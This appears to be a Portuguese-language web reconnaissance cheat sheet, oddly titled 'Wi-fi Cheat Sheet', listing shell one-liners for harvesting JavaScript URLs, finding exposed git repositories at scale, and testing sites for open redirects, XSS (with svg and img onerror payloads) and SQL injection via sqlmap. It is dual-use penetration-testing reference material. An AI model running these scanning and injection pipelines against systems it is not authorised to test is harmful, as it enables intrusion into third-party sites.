---
title: "Wi-fi Cheat Sheet"
permalink: /ct/reconb-cs/
layout: archive
author_profile: true
---

# Recon

Faz um levantamento de arquivos js e salva em um arquivo
```
echo [dominio] | gauplus | grep -iE '\.js' | anew [nome-arquivo] 
```

Valida se os arquivos js encontrados estão disponíveis
```
cat [nome-arquivo] | httpx -status-code -mc 200 | anew [nome-arquivo]
```

Passa lista para dentro de comandos que não recebem listas
```
xargs -a lista -I@ sh -c 'comando @'
```

encontrando git exposed em larga escala
```
echo [site] | subfinder -silent | xargs -I@ sh -c 'goop @ -f'
```

testando open redirect
```
waybackurls [site] | grep -a -i \=http | qsreplace 'https://softwall.com.br' | while read host do;do curl -s -L $host -I|grep "softwall.com.br" && echo -e "$host \033[0;31mVulnerable\n" ;done
```


CRONTAB :
```
59 10 * * * nuclei -update-templates ; echo "NUCLEI ATUALIZADO" | /usr/bin/notify >/dev/null 2>&1 >/dev/null 2>&1
```

Pegando IP dos subdominios, enumerando portas e vendo se tem vulns
```
echo [site] | subfinder -silent | httpx -silent -ip | awk '{print $2}' | tr -d '[]' | xargs -I@ sh -c 'echo @ | sdlookup -json | python3 -m json.tool' 
```

```
bbrf domains | httpx -ip -silent -no-color | awk '{print $2}' | anew | tr -d '[]' | xargs -I@ sh -c 'echo @ | sdlookup -json | python -m json.tool'
```

```
echo terra.com.br | httpx -silent -ip | awk '{print $2}' | tr -d '[]' | xargs -I@ sh -c 'echo @ | sdlookup -json | python -m json.tool'
```

Testando XSS
```
echo [site] | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"' | airixss -payload "confirm(1)" | egrep -v 'Not'
```

```
echo [site] | gauplus | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
```

```
echo [site] | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
```

```
echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
```

Testando SQLi
```
findomain -t [site] -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
```

```
subfinder -d [site] -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
```

Busca de SubDominio
```
curl -s "https://jldc.me/anubis/subdomains/[dominio]" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
```

